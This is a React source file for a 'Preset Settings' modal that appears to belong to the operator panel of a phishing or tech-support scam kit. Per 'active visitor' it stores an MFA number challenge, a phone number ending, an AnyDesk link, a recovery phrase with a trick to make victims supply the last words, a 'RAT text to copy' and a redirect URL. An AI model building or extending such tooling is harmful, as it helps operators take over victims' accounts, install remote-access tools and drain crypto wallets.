'use client';

import { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc-react";
import Button from "./ui/Button";
import Modal from "./ui/Modal";

export default function PresetSettingsModal({ targetId, onClose }) {
  const { data: preset } = trpc.presets.getByTarget.useQuery({ targetId }, { enabled: !!targetId });
  const upsertMutation = trpc.presets.upsert.useMutation({
    onSuccess: () => onClose(),
  });

  const [numberChallenge, setNumberChallenge] = useState("");
  const [phoneEnding, setPhoneEnding] = useState("");
  const [anydeskLink, setAnydeskLink] = useState("");
  const [recoveryPhrase, setRecoveryPhrase] = useState("");
  const [itLink, setItLink] = useState("");
  const [ratText, setRatText] = useState("");
  const [redirectUrl, setRedirectUrl] = useState("");

  useEffect(() => {
    if (preset) {
      setNumberChallenge(preset.number_challenge ?? "");
      setPhoneEnding(preset.phone_ending ?? "");
      setAnydeskLink(preset.anydesk_link ?? "");
      setRecoveryPhrase(preset.recovery_phrase ?? "");
      setItLink(preset.it_link ?? "");
      setRatText(preset.rat_text ?? "");
      setRedirectUrl(preset.redirect_url ?? "");
    }
  }, [preset]);

  async function handleSave() {
    await upsertMutation.mutateAsync({
      targetId,
      numberChallenge: numberChallenge || undefined,
      phoneEnding: phoneEnding || undefined,
      anydeskLink: anydeskLink || undefined,
      recoveryPhrase: recoveryPhrase || undefined,
      itLink: itLink || undefined,
      ratText: ratText || undefined,
      redirectUrl: redirectUrl || undefined,
    });
  }

  return (
    <Modal
      title="Preset Settings"
      subtitle="Adjust session-ready values for this active visitor."
      onClose={onClose}
      maxWidth={760}
      footer={(
        <>
          <Button onClick={onClose} variant="ghost" disabled={upsertMutation.isPending}>
            Cancel
          </Button>
          <Button onClick={handleSave} variant="primary" disabled={upsertMutation.isPending}>
            {upsertMutation.isPending ? "Saving..." : "Save Settings"}
          </Button>
        </>
      )}
    >
      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))", gap: "0.85rem" }}>
        <div>
          <label className="panel-field-label">Number challenge</label>
          <input value={numberChallenge} onChange={(e) => setNumberChallenge(e.target.value)} className="panel-input" />
        </div>
        <div>
          <label className="panel-field-label">Phone number ending</label>
          <input value={phoneEnding} onChange={(e) => setPhoneEnding(e.target.value)} className="panel-input" />
        </div>

        <div style={{ gridColumn: "1 / -1" }}>
          <label className="panel-field-label">AnyDesk Link</label>
          <input value={anydeskLink} onChange={(e) => setAnydeskLink(e.target.value)} className="panel-input" />
        </div>

        <div style={{ gridColumn: "1 / -1" }}>
          <label className="panel-field-label">Recovery phrase</label>
          <input value={recoveryPhrase} onChange={(e) => setRecoveryPhrase(e.target.value)} className="panel-input" />
          <p className="panel-soft" style={{ margin: "0.4rem 0 0", fontSize: "0.75rem" }}>
            12 or 24 words, or 10/22 words to trigger "representative will provide last 2 words".
          </p>
        </div>

        <div style={{ gridColumn: "1 / -1" }}>
          <label className="panel-field-label">It Link</label>
          <input value={itLink} onChange={(e) => setItLink(e.target.value)} className="panel-input" />
        </div>

        <div style={{ gridColumn: "1 / -1" }}>
          <label className="panel-field-label">RAT text to copy</label>
          <input value={ratText} onChange={(e) => setRatText(e.target.value)} placeholder="this part is not necessary" className="panel-input" />
        </div>

        <div style={{ gridColumn: "1 / -1" }}>
          <label className="panel-field-label">Redirect URL</label>
          <input value={redirectUrl} onChange={(e) => setRedirectUrl(e.target.value)} className="panel-input" />
        </div>
      </div>
    </Modal>
  );
}
